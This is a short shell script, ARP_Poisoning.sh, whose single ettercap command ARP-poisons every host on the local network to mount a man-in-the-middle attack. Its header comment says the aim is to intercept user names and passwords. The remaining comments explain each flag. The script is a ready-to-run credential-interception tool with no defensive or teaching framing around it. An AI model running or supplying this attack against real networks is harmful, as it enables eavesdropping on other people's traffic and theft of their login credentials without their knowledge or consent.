#								#ARP_Poisoning.sh
# Created by Matthew Sage
# Last modified: 05/10/09

#ARP Poisoning - Intercepts User Names and Passwords



ettercap -T -q -p -M ARP // //


#-T = Text Only
#-q = Dont display entire packet content
#-p = Do not  change interface into permiscuous mode
#-M = "Man-In-Middle attack"

#[Ctrl + Q = Quit]
